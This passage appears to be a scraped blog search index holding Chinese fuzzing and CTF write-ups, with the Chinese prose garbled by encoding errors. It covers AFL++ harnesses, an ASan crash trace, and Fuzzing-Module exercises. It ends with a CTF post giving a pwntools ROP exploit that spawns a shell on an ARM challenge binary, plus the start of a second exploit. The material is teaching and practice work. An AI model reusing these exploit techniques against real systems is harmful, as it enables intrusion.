process 8359 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
Warning:
Cannot insert breakpoint 2.
Cannot access memory at address 0x5555557b9125
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sendmail_1301&#34;&gt;sendmail_1301:&lt;/h2&gt;
&lt;h3 id=&#34;å‰è¨€-3&#34;&gt;å‰è¨€ï¼š&lt;/h3&gt;
&lt;p&gt;æœ¬æ–‡ä¸ºafl-trainingçš„ç¬¬ä¸‰ç¯‡ï¼Œé’ˆå¯¹&lt;code&gt;sendmail&lt;/code&gt;çš„fuzzï¼Œæ¯”è¾ƒäº†ä¸€ä¸‹æ™®é€šharnessæ™®é€šfuzzä¸å¹¶è¡Œfuzzçš„æ•ˆç‡æå‡ï¼Œä»¥åŠæ™®é€šharnessä¸ä¼˜åŒ–è¿‡åçš„harnessè¿›è¡Œfuzzæ—¶çš„æ•ˆç‡å·®åˆ«&lt;/p&gt;
&lt;h3 id=&#34;å‡†å¤‡å·¥ä½œ-3&#34;&gt;å‡†å¤‡å·¥ä½œï¼š&lt;/h3&gt;
&lt;p&gt;è¿™é“é¢˜å·²ç»å‡†å¤‡å¥½äº†&lt;code&gt;harness&lt;/code&gt;&lt;br&gt;
æ ¹æ®&lt;code&gt;makefile&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-makefile&#34;&gt;CFLAGS ?= -g

m1-bad: mime1-bad.c main.c
	${CC} ${CFLAGS} -o m1-bad mime1-bad.c main.c -I .

clean:
	rm -f *-bad *-ok
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬è®¾ç½®ç¯å¢ƒå˜é‡&lt;code&gt;export CC=afl-clang-fast&lt;/code&gt;åmakeå³å¯&lt;br&gt;
ç”Ÿæˆ&lt;code&gt;m1-bad&lt;/code&gt;ï¼Œæµ‹è¯•ä¸€ä¸‹èƒ½æ­£å¸¸è¿è¡Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/æ–‡æ¡£/fuzzing/afl-training/challenges/sendmail/1301$ ./m1-bad 1.txt 
buf-obuf=64
obp-obuf=0
canary-obuf=4294967268
canary = GOOD
obuf = 1

canary should be GOOD
canary = GOOD
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;fuzzing-2&#34;&gt;Fuzzing:&lt;/h3&gt;
&lt;p&gt;å»ºå¥½æ–‡ä»¶å¤¹å’Œç”Ÿæˆéšæœºç§å­ä¹‹åå¼€å§‹fuzz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;afl-fuzz -i ipt/ -o opt/ -- ./m1-bad @@
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ²¡æœ‰ä¿®æ”¹è¿‡çš„&lt;code&gt;harness&lt;/code&gt;ç¼–è¯‘å‡ºçš„è¿›è¡Œfuzzæ—¶è¡¨ç°å¦‚ä¸‹ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660225566.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åœ¨3minå·¦å³çš„æ—¶å€™è·‘å‡ºäº†crashï¼›&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬ä½¿ç”¨å¹¶è¡Œfuzzï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;afl-fuzz -i ipt1/ -o opt1/ -M f1 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f2 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f3 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f4 -- ./m1-bad @@
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ¬¡æˆ‘ä»¬ä¸åˆ°1minä¸»fuzzerå°±è·‘å‡ºäº†crashï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660232590.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ€åæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹å»¶è¿Ÿåˆå§‹åŒ–å’ŒæŒä¹…åŒ–æ¨¡å¼éœ€è¦å¤šä¹…èƒ½è·‘å‡º,ä¿®æ”¹ä¸€ä¸‹harness:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;quot;my-sendmail.h&amp;quot;
#include &amp;lt;assert.h&amp;gt;

int main(int argc, char **argv)
{

     HDR *header;
     register ENVELOPE *e;
     FILE *temp;

     #ifdef __AFL_HAVE_MANUAL_CONTROL
     __AFL_INIT();
     #endif 
     while(__AFL_LOOP(1000))
     {
          assert(argc == 2);
          temp = fopen(argv[1], &amp;quot;r&amp;quot;);
          assert(temp != NULL);

          header = (HDR *)malloc(sizeof(struct header));

          header-&amp;gt;h_field = &amp;quot;Content-Transfer-Encoding&amp;quot;;
          header-&amp;gt;h_value = &amp;quot;quoted-printable&amp;quot;;
          header-&amp;gt;h_link = NULL;
          header-&amp;gt;h_flags = 0;

          e = (ENVELOPE *)malloc(sizeof(struct envelope));
          e-&amp;gt;e_id = &amp;quot;First Entry&amp;quot;;
          e-&amp;gt;e_dfp = temp;


          mime7to8(header, e);

          fclose(temp);
          free(e);
          free(header);
          return 0;
     }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é‡æ–°makeåè¿›è¡Œfuzzï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660239113.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åœ¨2min30så·¦å³è·‘å‡ºcrashï¼Œç›¸è¾ƒäºæœ€åŸå§‹çš„harnessè¿˜æ˜¯æœ‰æ•ˆç‡æå‡çš„&lt;/p&gt;
&lt;h3 id=&#34;crashåˆ†æ-3&#34;&gt;crashåˆ†æï¼š&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;afl-tmin&lt;/code&gt;ç²¾ç®€æ ·æœ¬ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*;do afl-tmin -i $i -o ./tmp/$i  -- ./m1-bad @@;done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—åˆ°ç®€åŒ–åæ ·æœ¬&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/æ–‡æ¡£/fuzzing/afl-training/challenges/sendmail/1301/opt1/f1/crashes/tmp$ hexdump -C id\:000000\,sig\:11\,src\:000038\,time\:3687\,execs\:21373\,op\:havoc\,rep\:1 
00000000  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000230  30 30 30 30 30 30 30 30  30 30 30 3d 0a 30 30 30  |00000000000=.000|
00000240  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000260  30 30 30 3d 0a 30 30 30  30 30 30                 |000=.000000|
0000026b
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åç”¨&lt;code&gt;AFL_USE_ASAN=1&lt;/code&gt;çš„ç¼–è¯‘é€‰é¡¹é‡æ–°ç¼–è¯‘äº†ä¸€ä»½ä¹‹åè·‘æ ·æœ¬ç¡®å®šcrashå‘ç”Ÿå¤„ç¡®å®ä¸ç»™å‡ºçš„&lt;code&gt;mime1-bad.c&lt;/code&gt;ä¸­æ³¨é‡Š&lt;code&gt;BAD&lt;/code&gt;çš„åœ°æ–¹å»åˆ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;==2927476==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffdc92 at pc 0x555555631800 bp 0x7fffffffdbb0 sp 0x7fffffffdba8
WRITE of size 1 at 0x7fffffffdc92 thread T0
[Attaching after Thread 0x7ffff7e9cc40 (LWP 2927476) fork to child process 2927479]
[New inferior 2 (process 2927479)]
[Detaching after fork from parent process 2927476]
[Inferior 1 (process 2927476) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
process 2927479 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
    #0 0x5555556317ff in mime_fromqp /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/sendmail/1301/mime1-bad.c:248:18
    #1 0x5555556317ff in mime7to8 /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/sendmail/1301/mime1-bad.c:156:7
    #2 0x5555556323c6 in main /home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/sendmail/1301/main.c:94:11
    #3 0x7ffff7c29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #4 0x7ffff7c29e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #5 0x5555555733f4 in _start (/home/fk/æ–‡æ¡£/fuzzing/afl-training/challenges/sendmail/1301/opt/default/crashes/m1-bad+0x1f3f4) (BuildId: 774480b07edb24c4f93faf62426d5928c809433f)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å°ç»“&#34;&gt;å°ç»“ï¼š&lt;/h2&gt;
&lt;p&gt;ä»¥ä¸Šä¸ºafl-trainingå‡ ä¸ªå…·æœ‰ä»£è¡¨æ€§çš„ç»ƒä¹ ï¼Œå¸®åŠ©ç†Ÿæ‚‰afl++çš„fuzzæµç¨‹ï¼Œç°æ•´åˆä¸º1ç¯‡&lt;/p&gt;
">afl_training </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/5Wt1I5xiU/"" data-c="
          &lt;p&gt;é¡¹ç›®åœ°å€:&lt;a href=&#34;https://github.com/alex-maleno/Fuzzing-Module&#34;&gt;https://github.com/alex-maleno/Fuzzing-Module&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise1&#34;&gt;execersise1:&lt;/h3&gt;
&lt;p&gt;ä»¥ä¸‹ç¨‹åºå­˜åœ¨é—®é¢˜&lt;br&gt;
å½“è¾“å…¥çš„å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªæˆ–æœ€åä¸€ä¸ªå­—ç¬¦ä¸º&lt;code&gt;\x00&lt;/code&gt;æ—¶è§¦å‘&lt;code&gt;abort()&lt;/code&gt;&lt;br&gt;
å…¶æ¬¡å½“å¾ªç¯éå†åˆ°çš„å½“å‰å­—ç¬¦çš„æ•°å­—æ¯”å‰ä¸€ä¸ªéå†åˆ°çš„æ•°å­—å¤§1æ—¶è§¦å‘&lt;code&gt;abort()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

using namespace std;

int main() {

   string str;

   cout &amp;lt;&amp;lt; &amp;quot;enter input string: &amp;quot;;
   getline(cin, str);
   cout &amp;lt;&amp;lt; str &amp;lt;&amp;lt; endl &amp;lt;&amp;lt; str [0] &amp;lt;&amp;lt; endl;

    if(str[0] == 0 || str[str.length() - 1] == 0) {
        abort();
    }
    else {
        int count = 0;
        char prev_num = &#39;x&#39;;
        while (count != str.length() - 1) {
            char c = str[count];
            if(c &amp;gt;= 48 &amp;amp;&amp;amp; c &amp;lt;= 57) {
                if(c == prev_num + 1) {
                    abort();
                }
                prev_num = c;
            } 
            count++;
        }
    }
    
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“å‰ç›®å½•ä¸‹åˆ›å»º&lt;code&gt;ipt,opt&lt;/code&gt;æ–‡ä»¶å¤¹ï¼Œåœ¨&lt;code&gt;ipt/&lt;/code&gt;ä¸‹ç”Ÿæˆéšæœºç§å­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dd if=/dev/urandom of=1.in bs=64 count=10
dd if=/dev/urandom of=2.in bs=64 count=10
dd if=/dev/urandom of=3.in bs=64 count=10
dd if=/dev/urandom of=4.in bs=64 count=10
dd if=/dev/urandom of=5.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¼–è¯‘ç›®æ ‡&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast++ simple_crash.cpp -o sc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å½“å‰ç›®æ ‡æ–‡ä»¶å¤¹ä¸‹åˆ†åˆ«æ–°å»ºä¸€ä¸ªç”¨äºè¾“å…¥çš„æ–‡ä»¶å¤¹å’Œè¾“å‡ºçš„æ–‡ä»¶å¤¹&lt;br&gt;
ç„¶åå¼€å§‹fuzz&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-fuzz -i ipt/ -o opt/ -- ./sc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ¬åœ°ç¯å¢ƒä¸‹æµ‹è¯•ä¸åˆ°1minèƒ½å°†ä»¥ä¸Šè§¦å‘&lt;code&gt;abort()&lt;/code&gt;çš„è¾“å…¥å…¨éƒ¨è·‘å‡ºï¼Œè¾“å‡ºå­˜äºcrashçš„æ–‡ä»¶å¤¹ä¸‹&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977152581.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise2&#34;&gt;execersise2:&lt;/h3&gt;
&lt;p&gt;ä¸»è¦é€»è¾‘ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;/*
 * George Sidamon-Eristoff
 * 30 March 2022
 * Comp 98 - Senior Capstone, 2nd Semester
 * airplane_object.cpp contains the function contracs and definitions for the Airplane class
 *
 * Note: there are purposely not many comments so the bug is more difficult to find
 */

#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;

#include &amp;quot;airplane_object.hpp&amp;quot;


Airplane::Airplane(){
    crew.num = 2;
    crew.captain_name = &amp;quot;Captain&amp;quot;;
    crew.copilot_name = &amp;quot;CoPilot&amp;quot;;
}


void Airplane::takeoff(){
    if (crew.num &amp;gt;= 1) {
        std::cout &amp;lt;&amp;lt; &amp;quot;Takeoff!\n&amp;quot;;
    } else {
        std::cout &amp;lt;&amp;lt; &amp;quot;Nobody to fly the plane!\n&amp;quot;;
    }
    return;
}

void Airplane::land(){
    if (crew.num &amp;gt;= 1) {
        std::cout &amp;lt;&amp;lt; &amp;quot;Landed safely!\n&amp;quot;;
    } else {
        std::cout &amp;lt;&amp;lt; &amp;quot;Nobody left to land the plane!\n&amp;quot;;
    }
    return;
}

void Airplane::hire(){
    crew.num += 1;
    std::cout &amp;lt;&amp;lt; &amp;quot;Welcome aboard!\n&amp;quot;;
    return;
}


void Airplane::fire(){
    crew.num -= 1;
    std::cout &amp;lt;&amp;lt; &amp;quot;You&#39;re out of here!\n&amp;quot;;
    return;
}

void Airplane::interact() {
    std::string input  = &amp;quot;&amp;quot;;
    getline(std::cin, input);
    int input_length = input.length();
    if (input.empty()) {
        std::cout &amp;lt;&amp;lt; &amp;quot;No command.\n&amp;quot;;
    } else {
        int i = 0;
        while (input[i] != &#39;q&#39; and i &amp;lt; input_length) {
            // std::cout &amp;lt;&amp;lt; &amp;quot;i = &amp;quot; &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &amp;quot;  input[i] =&amp;quot; &amp;lt;&amp;lt; input[i] &amp;lt;&amp;lt; &amp;quot;\n&amp;quot;;
            if (input[i] == &#39;t&#39;) {
                takeoff();
            } else if (input[i] == &#39;l&#39;) {
                if (crew.num == 0) {
                    abort();
                }
                land();
            } else if (input[i] == &#39;h&#39;) {
                hire();
            } else if (input[i] == &#39;f&#39;) {
                fire();
            }
            i++;
        }
    }
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“è¾“å…¥&lt;code&gt;l&lt;/code&gt;æ—¶ä¼šåˆ¤æ–­&lt;code&gt;crew&lt;/code&gt;çš„æ•°é‡ï¼Œå½“&lt;code&gt;crew.num==0&lt;/code&gt;æ—¶ç¨‹åºè§¦å‘&lt;code&gt;abort()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æ­¤é¢˜ä½¿ç”¨cmakeï¼Œå½“å‰çª—å£ä¸´æ—¶è®¾ç½®ç¯å¢ƒå˜é‡æŒ‡å®šç¼–è¯‘å™¨ï¼Œè®¾ç½®å¥½ä¹‹å&lt;code&gt;env | grep &lt;/code&gt;æŸ¥çœ‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  export CC=afl-clang-fast
  export CXX=afl-clang-fast++
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶å&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cmake . &amp;amp;&amp;amp; make 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹‹åæ­£å¸¸fuzzï¼Œè·‘å‡º7ä¸ªcrashï¼Œä¸”éƒ½ç¬¦åˆä¸Šè¿°è§¦å‘&lt;code&gt;abort()&lt;/code&gt;çš„æ¡ä»¶&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977163715.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise3&#34;&gt;execersise3:&lt;/h3&gt;
&lt;p&gt;æ­¤æ¬¡ç»ƒä¹ ç†Ÿæ‚‰AFL++çš„ä¸€ä¸ªç‰¹æ€§ï¼Œ&lt;code&gt;delayed initialization&lt;/code&gt;&lt;br&gt;
è§¦å‘&lt;code&gt;abort()&lt;/code&gt;çš„å‡½æ•°å­˜åœ¨äº&lt;code&gt;specs.cpp&lt;/code&gt;ä¸­ï¼Œå¾ˆå®¹æ˜“è§¦å‘&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;
void Specs::choose_color() {
    std::string color;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter desired aircraft color: &amp;quot;;
    std::cin &amp;gt;&amp;gt; color;
    if (isNumber(color))
        abort();
}

void Specs::min_alt() {
    // bool too_low = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter aircraft minimum altitude: &amp;quot;;
    std::cin &amp;gt;&amp;gt; alt;
    // do {
        // too_low = false;
    if(alt &amp;lt; 0) {
        std::cout &amp;lt;&amp;lt; &amp;quot;too low. crashing!&amp;quot; &amp;lt;&amp;lt; std::endl;
        abort();
    }
    else if (alt &amp;gt; 500) {
        std::cout &amp;lt;&amp;lt; &amp;quot;too high. lowering to 500&amp;quot;;
        alt = 500;
        // too_low = true;
    }
    // } while(too_low);
}

void Specs::min_airspeed() {
    bool out_of_bounds = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter aircraft minimum airspeed: &amp;quot;;
    std::cin &amp;gt;&amp;gt; speed;
    do {
        out_of_bounds = false;
        if(speed &amp;lt; 0)
            abort();
        if(speed &amp;lt; 100) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too low. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; speed;
            out_of_bounds = true;
        } else if (speed &amp;gt; 200) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too high. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; speed;
            out_of_bounds = true;
        }
    } while(out_of_bounds);
}

void Specs::fuel_cap() {
    bool too_high = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter fuel capacity: &amp;quot;;
    std::cin &amp;gt;&amp;gt; fuel;
    do {
        too_high = false;
        if(fuel &amp;lt; 0)
            abort();
        if (fuel &amp;gt; 100) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too high. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; fuel;
            too_high = true;
        }
    } while(too_high);
}

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®˜æ–¹æ–‡æ¡£ : &lt;a href=&#34;https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md&#34;&gt;https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å®˜æ–¹æ–‡æ¡£ä¸­æè¿°çš„afl++åªæ‰§è¡Œä¸€æ¬¡ç¨‹åºï¼Œå¹¶åœ¨&lt;code&gt;main()&lt;/code&gt;ä¹‹å‰åœæ­¢ï¼Œç„¶åå…‹éš†è¿™ä¸ªä¸»è¿›ç¨‹ä¼˜åŒ–æ€§èƒ½ï¼Œå¦‚æ¶ˆé™¤ä¸€äº›æ—¶é—´æˆæœ¬ï¼Œæ¯”å¦‚ç¨‹åºçš„é“¾æ¥ç­‰ï¼Œä½†åœ¨ä¸€äº›æƒ…å†µä¸‹å¯èƒ½å¹¶ä¸æ€»æ˜¯æœ‰æ•ˆï¼Œå¦‚åŠ è½½ä¸€äº›è¾ƒå¤§çš„é…ç½®æ–‡ä»¶&lt;br&gt;
æ–‡æ¡£ä¸­æœ‰ä¸ªè¯å«&lt;code&gt;Deferred initialization &lt;/code&gt;,ç¿»è¯‘è¿‡æ¥å¯ä»¥å«ä½œ&lt;code&gt;å»¶è¿Ÿåˆå§‹åŒ–&lt;/code&gt;,æŒ‡åœ¨&lt;code&gt;main()&lt;/code&gt;å‡½æ•°ä¸­çš„æŸä¸ªä½ç½®å¼€å§‹å…‹éš†ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹å¯ä»¥æœ‰æ•ˆæé«˜æ•ˆç‡ï¼Œåªéœ€è¦ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#ifdef __AFL_HAVE_MANUAL_CONTROL
__AFL_INIT();
#endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥ä¸Šå‘½ä»¤æ·»åŠ åœ¨&lt;code&gt;main()&lt;/code&gt;ä¸­åˆå§‹åŒ–&lt;code&gt;spec&lt;/code&gt;åï¼Œæ¯”å¦‚&lt;code&gt;specs-slice.cpp&lt;/code&gt;ä¸­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;/*
 *
 *
 * This file isolates the Specs class and tests out the 
 * choose_color function specifically.
 * 
 * 
 * 
 */

#include &amp;quot;specs.h&amp;quot;

int main(int argc, char** argv) {
    // In order to call any functions in the Specs class, a Specs
    // object is necessary. This is using one of the constructors
    // found in the Specs class.
    Specs spec(505, 110, 50);
    // By looking at all the code in our project, this is all the 
    // necessary setup required. Most projects will have much more
    // that is needed to be done in order to properly setup objects.

    // This section should be in your code that you write after all the 
    // necessary setup is done. It allows AFL++ to start from here in 
    // your main() to save time and just throw new input at the target.
    #ifdef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif

    spec.choose_color();
    //spec.min_alt();

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥ä¸Šè¯´æ˜ç»“æŸåè¿›è¡Œfuzz&lt;/p&gt;
&lt;p&gt;è®¾ç½®&lt;code&gt;env&lt;/code&gt;ç¯å¢ƒå˜é‡åmake:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  export CC=afl-clang-fast
  export CXX=afl-clang-fast++
  make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“å‰ç›®å½•ä¸‹åˆ›å»º&lt;code&gt;ipt,opt&lt;/code&gt;æ–‡ä»¶å¤¹ï¼Œåœ¨&lt;code&gt;ipt/&lt;/code&gt;ä¸‹ç”Ÿæˆéšæœºç§å­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dd if=/dev/urandom of=1.in bs=64 count=10
dd if=/dev/urandom of=2.in bs=64 count=10
dd if=/dev/urandom of=3.in bs=64 count=10
dd if=/dev/urandom of=4.in bs=64 count=10
dd if=/dev/urandom of=5.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹‹åçš„fuzzéƒ½èƒ½è·‘å‡ºå¯¹åº”crash&lt;br&gt;
åˆ†åˆ«æµ‹è¯•äº†é»˜è®¤åˆå§‹åŒ–å’Œå»¶è¿Ÿåˆå§‹åŒ–çš„é€Ÿåº¦ï¼š&lt;br&gt;
å»¶è¿Ÿï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977127711.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
é»˜è®¤ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977134607.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿˜æ˜¯å¯ä»¥å‘ç°è¾ƒæ˜æ˜¾çš„é€Ÿåº¦å·®å¼‚&lt;/p&gt;
">Fuzzing Module</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VLuqmf0iP/"" data-c="
          &lt;h3 id=&#34;å‰è¨€&#34;&gt;å‰è¨€ï¼š&lt;/h3&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹æœ€è¿‘åšçš„å‡ é“å¼‚æ„å…¥é—¨é¢˜&lt;/p&gt;
&lt;h3 id=&#34;jarvisoj_typo&#34;&gt;jarvisoj_typoï¼š&lt;/h3&gt;
&lt;p&gt;32ä½armï¼Œé™æ€é“¾æ¥ï¼Œæœ¬åœ°æµ‹å‡ºåç§»åropå³å¯&lt;br&gt;
æ³¨æ„çš„æ˜¯å› ä¸ºå»æ‰äº†ç¬¦å·è¡¨æ‰€ä»¥&lt;code&gt;system&lt;/code&gt;å‡½æ•°å¯èƒ½éœ€è¦æ‰¾ä¸€ä¼šå„¿ï¼Œå¯ä»¥ä½¿ç”¨xrefæ‰¾&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,27348]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-arm-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;, &amp;quot;./typo&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;arm&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

str_sh=0x6c384
sys_addr=0x110b4


payload=cyclic(0x200)
io.sendafter(b&amp;quot;t\n&amp;quot;,b&amp;quot;\n&amp;quot;)
# io.send(payload)

#offset 112 
#0x00020904: pop {r0, r4, pc}; 


payload=cyclic(112)+p32(0x20904)+p32(str_sh)*2+p32(sys_addr)
io.sendafter(b&amp;quot;\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;shanghai2018_babyarm&#34;&gt;shanghai2018_babyarmï¼š&lt;/h3&gt;
&lt;p&gt;aarch64åŠ¨æ€é“¾æ¥ï¼Œå¼€å¯nxï¼Œå­˜åœ¨mprotectå‡½æ•°å¯ä»¥å¼€rwxæ®µå†™shellcode&lt;br&gt;
æ³¨æ„ä¸€ä¸‹è€ç”Ÿå¸¸è°ˆçš„å¸ƒæ ˆé—®é¢˜&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,25721]
#libc = ELF(&#39;&#39;)
elf = ELF(&#39;./pwn&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-aarch64-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
